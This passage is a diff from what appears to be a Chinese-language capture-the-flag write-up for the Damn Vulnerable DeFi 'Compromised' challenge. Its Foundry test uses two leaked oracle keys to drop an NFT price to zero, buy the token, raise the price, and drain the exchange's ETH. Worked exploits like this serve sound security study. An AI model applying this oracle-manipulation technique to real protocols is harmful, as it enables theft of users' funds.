@@ -133,41 +133,40 @@ if (address(this).balance < price) {
 
 ```solidity
 function test_compromised() public checkSolvedByPlayer {
-    // 题目双层解码得出的真实可信节点私钥
     uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
     uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
 
-    // 提前读取链上数据，规避 broadcast staticcall 报错
+    address source1 = vm.addr(pk1);  
+    address source2 = vm.addr(pk2);  
     string memory sym = nft.symbol();
 
-    // 1. 将预言机价格篡改至 0，低成本购入NFT
-    vm.startBroadcast(pk1);
+    // 压价买入 
+    // 控制2个节点，将中位数砸到0
+    vm.prank(source1);
     oracle.postPrice(sym, 0);
-    vm.stopBroadcast();
-
-    vm.startBroadcast(pk2);
+    
+    vm.prank(source2);
     oracle.postPrice(sym, 0);
-    vm.stopBroadcast();
 
-    // 玩家买入NFT
+    // 玩家白嫖买入（price=0，0.1 ETH绰绰有余）
     vm.prank(player);
     uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
 
-    // 2. 将价格篡改至交易所全部余额，实现套利掏空
-    vm.startBroadcast(pk1);
+    // 抬价卖出 
+    // 将价格拉到交易所全部余额
+    vm.prank(source1);
     oracle.postPrice(sym, EXCHANGE_INITIAL_ETH_BALANCE);
-    vm.stopBroadcast();
-
-    vm.startBroadcast(pk2);
+    
+    vm.prank(source2);
     oracle.postPrice(sym, EXCHANGE_INITIAL_ETH_BALANCE);
-    vm.stopBroadcast();
 
-    // 授权NFT并卖出，掏空交易所资金
+    // 授权并卖出，掏空交易所
     vm.startPrank(player);
     nft.approve(address(exchange), tokenId);
     exchange.sellOne(tokenId);
-
-    // 资金转入回收账户
+    
+    // 资金归集
+    // 全部转入回收账户
     payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
     vm.stopPrank();
 }
